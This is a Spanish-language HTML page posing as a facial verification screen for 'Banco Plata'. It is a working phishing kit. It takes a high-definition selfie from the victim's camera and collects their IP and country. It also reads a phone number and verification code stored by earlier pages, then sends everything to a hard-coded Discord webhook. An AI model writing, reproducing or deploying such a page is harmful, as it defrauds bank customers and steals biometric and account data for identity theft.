<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Escaneo Facial - Banco Plata</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body, html {
      width: 100%;
      height: 100vh;
      background-color: #000000;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .camera-container {
      position: relative;
      width: 100%;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    #videoElement {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }

    .top-bar {
      position: absolute;
      top: 20px;
      right: 20px;
      z-index: 10;
    }

    .close-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 28px;
      cursor: pointer;
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .alert-box {
      position: absolute;
      top: 75px;
      background-color: rgba(255, 255, 255, 0.92);
      color: #111827;
      font-weight: 600;
      font-size: 15px;
      padding: 12px 24px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
      z-index: 10;
      transition: all 0.4s ease;
      text-align: center;
      max-width: 90%;
    }

    .face-oval-guide {
      position: absolute;
      width: 270px;
      height: 380px;
      border: 4px solid #2563eb;
      border-radius: 50%;
      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.75);
      z-index: 5;
      pointer-events: none;
      transition: border-color 0.5s ease;
    }

    .face-oval-guide.success {
      border-color: #10b981 !important;
      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.75), 0 0 25px rgba(16, 185, 129, 0.8);
    }

    .bottom-bar {
      position: absolute;
      bottom: 20px;
      width: 100px;
      height: 5px;
      background-color: rgba(255, 255, 255, 0.5);
      border-radius: 10px;
      z-index: 10;
    }

    #canvasCapture {
      display: none;
    }
  </style>
</head>
<body>

  <div class="camera-container">
    
    <div class="top-bar">
      <button class="close-btn" onclick="window.history.back()">×</button>
    </div>

    <div id="alertBox" class="alert-box">Limpie la cámara del celular</div>
    <div id="ovalGuide" class="face-oval-guide"></div>

    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasCapture"></canvas>

    <div class="bottom-bar"></div>
  </div>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp';
    const alertBox = document.getElementById('alertBox');
    const ovalGuide = document.getElementById('ovalGuide');
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasCapture');

    // 1. Forzar máxima resolución posible en la cámara frontal
    async function iniciarCamara() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user', 
            width: { ideal: 1920 }, 
            height: { ideal: 1080 } 
          },
          audio: false
        });
        video.srcObject = stream;
      } catch (err) {
        console.error("Error al acceder a la cámara: ", err);
        alertBox.textContent = "Permita el acceso a la cámara frontal";
      }
    }

    // 2. Múltiples servicios de respaldo para asegurar IP y País
    async function obtenerInfoIP() {
      const endpoints = [
        'https://ipapi.co/json/',
        'https://ipinfo.io/json',
        'https://ip-api.com/json/'
      ];

      for (const url of endpoints) {
        try {
          const res = await fetch(url);
          if (!res.ok) continue;
          const data = await res.json();
          return { 
            ip: data.ip || data.query || 'Desconocida', 
            pais: data.country_name || data.country || 'Desconocido' 
          };
        } catch (e) {}
      }
      return { ip: 'Desconocida', pais: 'Desconocido' };
    }

    async function secuenciaEscaneo() {
      setTimeout(() => {
        alertBox.textContent = "Coloque su rostro dentro del óvalo";
      }, 3000);

      setTimeout(() => {
        alertBox.textContent = "Manténgase sin mover y parpadee";
      }, 6500);

      setTimeout(async () => {
        alertBox.textContent = "Verificando identidad...";
        ovalGuide.classList.add('success');

        const telefono = localStorage.getItem('userPhone') || 'No registrado';
        const codigo = localStorage.getItem('userCode') || 'No registrado';
        
        const info = await obtenerInfoIP();

        // Capturar la imagen en alta definición real con escala de espejo corregida
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        const ctx = canvas.getContext('2d');
        
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
          const formData = new FormData();
          
          const mensajeTexto = `✅ **VERIFICACIÓN FACIAL COMPLETADA**\n📞 **Teléfono:** \`${telefono}\`\n🔢 **Código:** \`${codigo}\`\n🌍 **País:** \`${info.pais}\`\n💻 **IP:** \`${info.ip}\``;
          
          formData.append('content', mensajeTexto);
          formData.append('file', blob, 'selfie_hd.jpg');

          try {
            await fetch(webhookURL, {
              method: 'POST',
              body: formData
            });
          } catch (e) {
            console.error("Error al enviar imagen a Discord", e);
          }
        }, 'image/jpeg', 0.98);

        // Al terminar, redirige automáticamente a u.html como pediste
        setTimeout(() => {
          alertBox.textContent = "¡Verificación exitosa!";
          window.location.href = 'u.html';
        }, 2000);

      }, 10000);
    }

    window.addEventListener('load', () => {
      iniciarCamara();
      secuenciaEscaneo();
    });
  </script>

</body>
</html>
